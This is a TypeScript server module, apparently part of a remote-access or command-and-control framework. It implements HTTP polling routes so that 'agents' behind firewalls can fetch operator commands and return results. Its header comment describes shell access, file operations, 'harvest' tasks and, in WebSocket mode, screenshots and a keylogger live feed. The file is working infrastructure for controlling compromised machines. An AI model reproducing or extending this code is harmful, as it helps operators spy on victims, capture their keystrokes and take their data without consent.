/**
 * HTTP polling fallback for agents behind firewalls that block WebSockets.
 *
 * GET  /api/poll/:clientId/tasks
 *   Returns a JSON array of pending commands for this agent.
 *   Each command has an `id`, `commandType`, `payload`, and optional `expiresAt`.
 *   Commands are removed from the queue once delivered.
 *   Returns 204 when the queue is empty.
 *
 * POST /api/poll/:clientId/results
 *   Accepts a JSON body: { id: string, result: any, error?: string }
 *   Routes the result back to the waiting operator session.
 *   Returns 200 { ok: true } on success.
 *
 * Auth: X-Agent-Token header (same as WebSocket auth).
 *
 * Limitations vs. WebSocket mode:
 *   - No real-time streaming (screenshots, keylogger live feed, etc.)
 *   - Commands are polled, not pushed
 *   - Suitable for basic tasking (shell, file ops, harvest) in restricted nets
 */

import { isAuthorizedAgentRequest } from "../agent-auth";
import { getConfig } from "../../config";
import { logger } from "../../logger";
import { upsertClientRow, setOnlineState } from "../../db";

// In-memory command queue per client ID.
// In a production deployment with multiple server instances this should
// use a shared store (Redis, SQLite-backed queue, etc.).
type PollCommand = {
  id: string;
  commandType: string;
  payload?: unknown;
  expiresAt?: number; // epoch ms; omit for no expiry
  enqueuedAt: number;
};

type PollResult = {
  id: string;
  clientId: string;
  result?: unknown;
  error?: string;
  receivedAt: number;
};

const pollQueues = new Map<string, PollCommand[]>();
const pollResults = new Map<string, PollResult>();

// Resolve callbacks waiting on a result (operator-side long-poll).
const resultWaiters = new Map<string, (r: PollResult) => void>();

/** Enqueue a command for an agent. Called by the operator-side command dispatch. */
export function enqueuePollCommand(clientId: string, cmd: Omit<PollCommand, "enqueuedAt">): void {
  let queue = pollQueues.get(clientId);
  if (!queue) {
    queue = [];
    pollQueues.set(clientId, queue);
  }
  queue.push({ ...cmd, enqueuedAt: Date.now() });
  logger.debug(`[poll] Enqueued command ${cmd.commandType} for ${clientId} (queue: ${queue.length})`);
}

/** Wait for a result from an agent (operator side), with a timeout. */
export function waitForPollResult(cmdId: string, timeoutMs = 30_000): Promise<PollResult | null> {
  const existing = pollResults.get(cmdId);
  if (existing) {
    pollResults.delete(cmdId);
    return Promise.resolve(existing);
  }
  return new Promise<PollResult | null>((resolve) => {
    const timer = setTimeout(() => {
      resultWaiters.delete(cmdId);
      resolve(null);
    }, timeoutMs);
    resultWaiters.set(cmdId, (r) => {
      clearTimeout(timer);
      resultWaiters.delete(cmdId);
      resolve(r);
    });
  });
}

function pruneExpiredCommands(queue: PollCommand[]): PollCommand[] {
  const now = Date.now();
  return queue.filter((cmd) => !cmd.expiresAt || cmd.expiresAt > now);
}

function validateClientId(raw: string): string | null {
  const decoded = decodeURIComponent(raw);
  return /^[A-Za-z0-9._:-]{1,128}$/.test(decoded) ? decoded : null;
}

export async function handlePollRoutes(
  req: Request,
  url: URL,
): Promise<Response | null> {
  const cfg = getConfig();

  // GET /api/poll/:clientId/tasks
  const tasksMatch = url.pathname.match(/^\/api\/poll\/(.+)\/tasks$/);
  if (tasksMatch && req.method === "GET") {
    if (!isAuthorizedAgentRequest(req, cfg.auth.agentToken)) {
      return new Response("Unauthorized", { status: 401 });
    }
    const clientId = validateClientId(tasksMatch[1]);
    if (!clientId) return new Response("Bad Request", { status: 400 });

    // Mark as online in DB (heartbeat).
    try { setOnlineState(clientId, true); } catch { /* ignore if not enrolled yet */ }

    let queue = pollQueues.get(clientId) ?? [];
    queue = pruneExpiredCommands(queue);
    pollQueues.set(clientId, queue);

    if (queue.length === 0) {
      return new Response(null, { status: 204 });
    }

    // Deliver all pending commands, clear the queue.
    const toDeliver = [...queue];
    pollQueues.set(clientId, []);
    logger.debug(`[poll] Delivering ${toDeliver.length} command(s) to ${clientId}`);

    return new Response(JSON.stringify(toDeliver), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  }

  // POST /api/poll/:clientId/results
  const resultsMatch = url.pathname.match(/^\/api\/poll\/(.+)\/results$/);
  if (resultsMatch && req.method === "POST") {
    if (!isAuthorizedAgentRequest(req, cfg.auth.agentToken)) {
      return new Response("Unauthorized", { status: 401 });
    }
    const clientId = validateClientId(resultsMatch[1]);
    if (!clientId) return new Response("Bad Request", { status: 400 });

    let body: { id?: string; result?: unknown; error?: string };
    try {
      body = await req.json() as typeof body;
    } catch {
      return new Response("Bad Request: invalid JSON", { status: 400 });
    }

    if (!body.id || typeof body.id !== "string") {
      return new Response("Bad Request: missing id", { status: 400 });
    }

    const record: PollResult = {
      id: body.id,
      clientId,
      result: body.result,
      error: body.error,
      receivedAt: Date.now(),
    };

    const waiter = resultWaiters.get(body.id);
    if (waiter) {
      waiter(record);
    } else {
      pollResults.set(body.id, record);
      // Evict stale results after 60 s.
      setTimeout(() => pollResults.delete(body.id), 60_000);
    }

    logger.debug(`[poll] Received result for command ${body.id} from ${clientId}`);
    return new Response(JSON.stringify({ ok: true }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  }

  return null;
}
